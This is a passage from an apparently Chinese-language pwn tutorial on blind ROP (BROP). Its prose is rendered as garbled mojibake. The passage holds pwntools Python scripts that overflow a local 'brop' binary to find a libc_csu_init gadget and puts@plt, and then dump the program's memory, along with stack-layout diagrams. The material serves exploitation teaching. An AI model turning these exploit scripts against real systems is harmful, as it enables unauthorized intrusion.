trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           stop            | &lt;----- stop gadgetï¼Œä¸ä¼šä½¿ç¨‹åºå´©æºƒï¼Œä½œä¸ºprobeçš„retä½</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trapsï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trapï¼Œç¨‹åºä¸­ä¸å­˜åœ¨çš„åœ°å€ï¼Œå½“IPæŒ‡é’ˆæŒ‡å‘è¯¥å¤„æ—¶å´©æºƒ</span><br><span class="line">+---------------------------+</span><br><span class="line">|           probe           | &lt;----- æ¢é’ˆ</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºæ˜¯å¦å´©æºƒæ¥åˆ¤æ–­probeæ¢é’ˆä¸­å¯èƒ½å­˜åœ¨çš„æ±‡ç¼–è¯­å¥ï¼Œåœ¨è¿™æ ·å¸ƒå±€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ²¡æœ‰å´©æºƒï¼Œè¯´æ˜stop gadgetè¢«æ‰§è¡Œäº†ã€‚è¯´æ˜è¯¥probeæ¢é’ˆä¸­å­˜åœ¨6ä¸ªpopæ“ä½œï¼Œå¹¶ä¸”æœ‰retï¼Œå› ä¸ºåªæœ‰åœ¨6ä¸ªpopæ“ä½œä¹‹åprobeåé¢çš„trapæ‰èƒ½å¼¹è¿›å¯„å­˜å™¨ï¼Œä¹‹åspæŒ‡é’ˆæ‰èƒ½æŒ‡å‘stop gadgetï¼Œè¿™ä¸ªæ—¶å€™stop gadgetåªæœ‰åœ¨retä½ç½®æ‰èƒ½è¢«æ‰§è¡Œï¼Œå› æ­¤ç¨‹åºä¸ä¼šå´©æºƒ<br>å›åˆ°æˆ‘ä»¬ä¹‹é—´è¯´çš„å¯»æ‰¾brop gadgetç¯èŠ‚ï¼Œæˆ‘ä»¬è¿™ä¸ªç¯èŠ‚è¦æ‰¾çš„å°±æ˜¯libc_csu_initæœ€åçš„6ä¸ªpopåŠ retï¼Œé‚£ä¹ˆæ ¹æ®å‰é¢çš„è®²è§£æˆ‘ä»¬å¯ä»¥å¤§è‡´çš„é€šè¿‡trapã€stopè¿™ç§æ–¹å¼åšä¸€ä¸ªç®€å•çš„æ’åˆ—ï¼š<br>addrï¼Œtrap, trap, trap, trap, trap, trap, stop, traps<br>ä»¥ä¸Šé¢è¿™ç§æ’åˆ—çš„è¯ï¼Œaddré€šè¿‡å¾ªç¯ä¸æ–­å¢åŠ åœ°å€ä½ï¼Œåªæœ‰addræ‰€åœ¨åœ°å€æ‹¥æœ‰6ä¸ªpopæ“ä½œå¹¶retçš„æ—¶å€™æ‰ä¼šæ‰§è¡Œstopgadgetã€‚</li></ul><p><strong>å¾ªç¯å†…å®¹ï¼šé€’å¢åœ°å€ï¼Œæ‰¾åˆ°å¯ä»¥æ‰§è¡Œ6ä¸ªpopå’Œä¸€ä¸ªretæ“ä½œçš„gadget</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šç¨‹åºä¸å´©æºƒï¼Œå¹¶å‡ºç°èµ·å§‹çš„è¾“å‡ºæç¤ºâ€™WelComeâ€™å­—ç¬¦</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šæ‰¾åˆ°libc_csu_initå‡½æ•°çš„æœ€åä¸€ä¸ªgadgetï¼Œé€šè¿‡åç§»è®¡ç®—å‡ºpopr diåœ°å€</strong><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>): <span class="comment">#æŸ¥æ‰¾brop gadgetå‡½æ•°</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget) </span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> (content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">          <span class="comment">#åˆ¤æ–­æç¤ºç¬¦æ˜¯å¦å‡ºç°èµ·å§‹æç¤ºå­—ç¬¦ï¼Œå¦‚æœæœ‰è¯´æ˜ç¨‹åºæ²¡å´©æºƒ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):<span class="comment">#æ£€æŸ¥åœ°å€</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">addr = <span class="number">0x4007b0</span> </span><br><span class="line"><span class="comment">#ç†è®ºä¸Šåº”è¯¥ä»0x400000å¼€å§‹å¯»æ‰¾ï¼Œä½†æ˜¯è¿™ä¸ªç¯èŠ‚è¦æ‰¾çš„æ˜¯Libc_csu_initå‡½æ•°ï¼Œæ‰€ä»¥å¤§å¤šæ•°çš„libcä¸­Libc_csu_initå‡½æ•°çš„èµ·å§‹åœ°å€éƒ½åœ¨0x400750ä¹‹åï¼Œæ‰€ä»¥ä¸ºäº†å‡å°‘è¯¯å·®ï¼Œä»0x400750å¼€å§‹</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#å¾ªç¯é€’å¢è¦æµ‹è¯•çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206210120.png" alt="Pasted image 20250206210120"></p><p>è¿è¡Œä¹‹åä¼šå¾—åˆ°å¾ˆå¤šçš„gadgetåœ°å€ï¼Œä½†æ˜¯åªæœ‰0x4007baæ˜¯å¯ä»¥ç»§ç»­è¿›è¡Œæ“ä½œçš„ï¼Œå¦‚æœæƒ³æ‰¾åˆ°æ›´å¤šçš„gadgetåœ°å€å¯ä»¥å‚è€ƒå¯»æ‰¾stop gadgetæ–¹æ³•ã€‚<br>æ ˆä¸­å¸ƒå±€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          .....           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       stop gadget        | stop gadgetä½œä¸ºretè¿”å›åœ°å€</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0</span>           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |         <span class="number">0x400740</span>+         | é€’å¢åœ°å€è¦†ç›–åŸretè¿”å›ä½ç½®</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²è¦†ç›–åŸsaved ebpä½ç½®</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">ebp-ï¼Ÿ--&gt;+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬æ‰¾åˆ°brop gadgetä¹‹ååŠ ä¸Š0x09çš„åç§»å°±å¯ä»¥å¾—åˆ°pop rdiï¼›retæ“ä½œçš„åœ°å€0x4007c3</p><h5 id="4-å¯»æ‰¾puts-pltåœ°å€"><a href="#4-å¯»æ‰¾puts-pltåœ°å€" class="headerlink" title="4.å¯»æ‰¾puts@pltåœ°å€"></a>4.å¯»æ‰¾puts@pltåœ°å€</h5><p>é€šè¿‡å‰é¢çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸€äº›è§„å¾‹ï¼Œæ¯”å¦‚æˆ‘ä»¬éœ€è¦ä»€ä¹ˆå°±æŠŠä»–æ‰”è¿›å¾ªç¯é€’å¢ï¼Œæ€»ä¼šæœ‰ä¸€æ¬¡å¾ªç¯ä¼šå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œåœ¨ä¸Šä¸€æ­¥æˆ‘ä»¬æ‰¾åˆ°äº†pop rdiï¼›retè¿™ä¸ªgadgetçš„åœ°å€äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶putså‡½æ•°çš„è¾“å‡ºå†…å®¹ã€‚æˆ‘ä»¬å°±éœ€è¦ç”¨è¿™ä¸ªgadgetæ‰¾åˆ°puts_pltçš„åœ°å€<br>æ ¹æ®ä¸Šé¢æ‰€è¯´çš„å¦‚æœæˆ‘ä»¬è°ƒç”¨putså‡½æ•°ï¼Œå¿…é¡»å°†putså‡½æ•°çš„å‚æ•°åœ°å€å…ˆéƒ¨ç½²è¿›rdiå¯„å­˜å™¨ä¸­ï¼Œç„¶åè°ƒç”¨putså‡½æ•°å°†rdiä¸­åœ°å€å†…çš„å‚æ•°æ‰“å°å‡ºæ¥<br>ä½†æ˜¯ç”±äºå¼€å¯äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åœ¨æ ˆä¸­éƒ¨ç½²å¤–éƒ¨çš„å˜é‡æˆ–è€…å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªç¨‹åºå†…éƒ¨çš„ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¿™ä¸ªå­—ç¬¦ä¸²å¿…é¡»å”¯ä¸€çš„ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹ï¼Œåœ¨æ²¡æœ‰å¼€å¯PIEä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œ0x400000å¤„ä¸ºELFæ–‡ä»¶çš„å¤´éƒ¨ï¼Œå…¶å†…å®¹ä¸ºâ€™ \ x7fELFâ€™</p><p><strong>å¾ªç¯å†…å®¹ï¼šé€’å¢åœ°å€ï¼Œæ‰¾åˆ°å¯ä»¥è¿›è¡Œæ‰“å°çš„puts_pltåœ°å€</strong><br><strong>å¾ªç¯ç»ˆæ­¢æ¡ä»¶ï¼šæ¥æ”¶å­—ç¬¦ä¸²å‡ºç°â€™\ x7fELFâ€™å­—æ ·</strong><br><strong>æ‰§è¡Œç›®çš„ï¼šä¸ºåç»­æ‰¾åˆ°puts_gotåœ°å€åšå‡†å¤‡</strong><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400559</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72ä¸ªAå¡«å……æ ˆç©ºé—´ï¼Œè°ƒç”¨pop rdiï¼›ret gadgetå°†0x400000popè¿›rdiå¯„å­˜å™¨ï¼Œå¾ªç¯å¢é•¿çš„åœ°å€æ”¾åœ¨gadgetçš„retä½ç½®ï¼Œåœ¨æ‰§è¡Œå®Œgadgetåç›´æ¥è°ƒç”¨å¾ªç¯å¢é•¿çš„åœ°å€ï¼Œå¦‚æœå¢é•¿åˆ°puts_pltåœ°å€å°±ä¼šæ‰“å°rdiå¯„å­˜å™¨ä¸­åœ°å€å†…å­˜æ”¾çš„å­—ç¬¦ä¸²ï¼Œæœ€åçš„stop gadgetæ˜¯ä¸ºäº†è®©ç¨‹åºä¸å´©æºƒ</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):<span class="comment">#åˆ¤æ–­æ˜¯å¦æ‰“å°\x7fELF</span></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">0x9</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">puts = get_puts_addr(length,rdi_ret,stop_gadget)</span><br><span class="line"><span class="comment">#find puts@plt addr: 0x400565</span></span><br></pre></td></tr></table></figure><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206211035.png" alt="Pasted image 20250206211035"><br>æ ˆä¸­å¸ƒå±€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |       stop gadget        | stop gadgetç¡®ä¿ç¨‹åºä¸å´©æºƒ</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       <span class="number">0x400000</span>+        | å¾ªç¯é€’å¢åœ°å€ï¼Œä½œä¸ºpopçš„retåœ°å€</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="number">0x400000</span>        | ELFèµ·å§‹åœ°å€ï¼Œåœ°å€å†…å­˜æ”¾<span class="string">&#x27;ã€x7fELF&#x27;</span></span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          <span class="number">0x4007c3</span>         | pop rdiï¼›retåœ°å€è¦†ç›–åŸretè¿”å›ä½ç½®</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²è¦†ç›–åŸsaved ebpä½ç½®</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">             |             a             | aå­—ç¬¦ä¸²å ä½å¡«æ»¡æ ˆç©ºé—´</span><br><span class="line">ebp-ï¼Ÿ--&gt;+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="5-æ³„éœ²puts-gotåœ°å€"><a href="#5-æ³„éœ²puts-gotåœ°å€" class="headerlink" title="5.æ³„éœ²puts_gotåœ°å€"></a>5.æ³„éœ²puts_gotåœ°å€</h5><p>åœ¨å¾—åˆ°puts_pltåœ°å€åï¼Œæ¥ä¸‹æ¥å°±éœ€è¦å°†puts_gotåœ°å€æ³„éœ²å‡ºæ¥ï¼Œå¾—åˆ°puts_gotåœ°å€ä¹‹åå°±å¯ä»¥åˆ©ç”¨LibcSearcheræŸ¥æ‰¾å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œå†æ ¹æ®ç‰ˆæœ¬æ‰¾åˆ°libcä¸­çš„systemå‡½æ•°å’Œ/bin/sh</p><p>åœ¨æ³„éœ²ä¹‹å‰éœ€è¦çŸ¥é“ä¸€ä¸‹Linuxä¸­pltè¡¨å’Œgotè¡¨çš„å…³ç³»ï¼Œæˆ‘ä»¬å°±æ‹¿putså‡½æ•°ä¸¾ä¾‹<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|    GOTè¡¨     |</span><br><span class="line">+---------------------+   +--------------+æ‰¾åˆ°çœŸå®åœ°å€   +--------------+</span><br><span class="line">|  PLTè¡¨  | jmp gotè¡¨  |-----&gt; |putsçš„çœŸå®åœ°å€ | -------------&gt;|    putså‡½æ•°   |</span><br><span class="line">+---------------------+   +--------------+  +--------------+</span><br><span class="line">è·³è½¬åˆ°gotè¡¨ä¸­å­˜æ”¾puts              |              |</span><br><span class="line"> å‡½æ•°çœŸå®åœ°å€çš„åœ°å€          | |</span><br><span class="line"> |  |</span><br><span class="line"> |         |</span><br><span class="line"> |     |</span><br><span class="line"> +--------------+</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šå›¾æˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹call putsçš„è¿‡ç¨‹ï¼Œåœ¨æ‰§è¡Œcall putsä¹‹åç¨‹åºé¦–å…ˆä¼šåœ¨PLTè¡¨ä¸­å¯»æ‰¾puts_pltçš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨puts_pltåœ°å€ä¸­å­˜æ”¾çš„æ˜¯GOTè¡¨ä¸­å­˜æ”¾putså‡½æ•°çœŸå®åœ°å€çš„åœ°å€ï¼Œæ¥ä¸‹æ¥ä¼šåœ¨GOTè¡¨ä¸­æ‰¾åˆ°å­˜æ”¾putsçœŸå®åœ°å€çš„åœ°å€ï¼Œæ¥ä¸‹æ¥æ‰“å¼€ç›’å­æ ¹æ®çœŸå®æ‰¾åˆ°äº†putså‡½æ•°<br>åœ¨ret2csuä¸­æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯LibcSearcheræŸ¥æ‰¾çš„å‡½æ•°gotè¡¨åœ°å€ï¼Œé‚£ä¹ˆç”±äºè¿™é“é¢˜å¼€å¯äº†ASLRï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å·¥å…·å»è·å–åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰‹åŠ¨çš„å»æ‰¾ï¼Œæ‰¾çš„å°±æ˜¯åœ¨puts_pltåœ°å€ä¸­å­˜æ”¾çš„jmpæŒ‡ä»¤åæ¥çš„åœ°å€ã€‚å¦‚æœè§‰å¾—ä¸æ‡‚ï¼Œçœ‹ä¸€ä¸‹ä¸Šé¢çš„å›¾ï¼ŒjmpæŒ‡ä»¤åé¢æ¥çš„å°±æ˜¯puts_gotçš„åœ°å€ã€‚ç”±äºä¸èƒ½å®ç”¨å·¥å…·ï¼Œæˆ‘ä»¬åªèƒ½æ‰‹åŠ¨çš„è®²æ•´ä¸ªPLTéƒ¨åˆ†éƒ½dumpå‡ºæ¥ã€‚dumpå‡ºæ¥çš„æ–‡ä»¶é‡æ–°è®¾ç½®åŸºåœ°å€0x400000ï¼Œå†æ ¹æ®å‰é¢å¾—åˆ°çš„puts_pltåœ°å€æ‰¾åˆ°å¯¹åº”ä½ç½®ï¼ŒæŸ¥çœ‹è¯¥åœ°å€å†…çš„æ±‡ç¼–æŒ‡ä»¤<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dump the bin file</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">    sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72ä¸ªaå¡«æ»¡æ ˆç©ºé—´è‡³retä½ç½®ï¼Œåæ¥pop rdiï¼›ret gadgetï¼Œå¾ªç¯é€’å¢çš„åœ°å€è¢«popè¿›rdiå¯„å­˜å™¨ï¼Œæ¥ä¸‹æ¥å°†puts_pltåœ°å€é˜²æ­¢åœ¨gadget retä½ç½®è¿›è¡Œè°ƒç”¨æ‰“å°å¾ªç¯é€’å¢çš„åœ°å€ï¼Œæœ€ååŠ ä¸Šstop gadgeté˜²æ­¢å´©æºƒ</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">b&quot;\nWelCome&quot;</span>)]<span class="comment">#å°†æ¥æ”¶çš„\nWelComeä¹‹å‰çš„å­—ç¬¦ä¸²äº¤ç»™dataå˜é‡</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&quot;&quot;</span>: <span class="comment">#å¦‚æœdataè¢«èµ‹å€¼ä¹‹åä¸ºç©ºï¼Œé‚£ä¹ˆå°±è¯´æ˜å·²ç»å®Œæˆæ•´ä¸ªdumpè¿‡ç¨‹ï¼Œæ·»åŠ \x00æˆªæ–­</span></span><br><span class="line">            data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400565</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span> <span class="comment">#å‡†å¤‡ä¸€ä¸ªç©ºå­—ç¬¦ä¸²æ¥æ”¶dumpå‡ºæ¥çš„ä»£ç </span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:   <span class="comment">#ä»0x400000å¼€å§‹æ³„éœ²0x1000ä¸ªå­—èŠ‚ï¼Œè¶³ä»¥åŒ…å«ç¨‹åºçš„pltéƒ¨åˆ†</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#åˆ¤æ–­æ¥æ”¶å­—ç¬¦æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">        result += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        addr +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data <span class="comment">#æ¥æ”¶å­—ç¬¦ä¸²</span></span><br><span class="line">    addr += <span class="built_in">len</span>(data)  <span class="comment">#addr+æ¥æ”¶å­—ç¬¦ä¸²ä¸ªæ•°ï¼Œé¿å…æ¥æ”¶é‡å¤çš„å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment">#åœ¨å½“å‰ç›®å½•ä¸‹ä»¥äºŒè¿›åˆ¶å½¢å¼å‘hollkæ–‡ä»¶ä¸­å†™</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><br>ä¸ªæ–‡ä»¶å°±æ˜¯æˆ‘ä»¬dumpå‡ºæ¥çš„æ–‡ä»¶ï¼Œå…¶å®ä½ å¯ä»¥æŠŠä»–æ¯”ä½œWindowsä¸‹è„±å£³ä¹‹åçš„æ–‡ä»¶ã€‚è™½ç„¶åœ¨å®é™…æƒ…å†µä¸‹æˆ‘ä»¬çœ‹ä¸åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬dumpå‡ºæ¥çš„pltæ®µçš„å†…å®¹å¯ä»¥ä½¿ç”¨IDAè¿›è¡ŒæŸ¥çœ‹ã€‚å°†dumpæ–‡ä»¶æ‹–è¿›64ä½IDAï¼Œé€‰æ‹©binary Fileå½¢å¼æ‰“å¼€ï¼Œé€‰æ‹©64-bit mode<br>æ¥ä¸‹æ¥éœ€è¦ç»™dumpæ–‡ä»¶è®¾ç½®åŸºåœ°å€ï¼Œå› 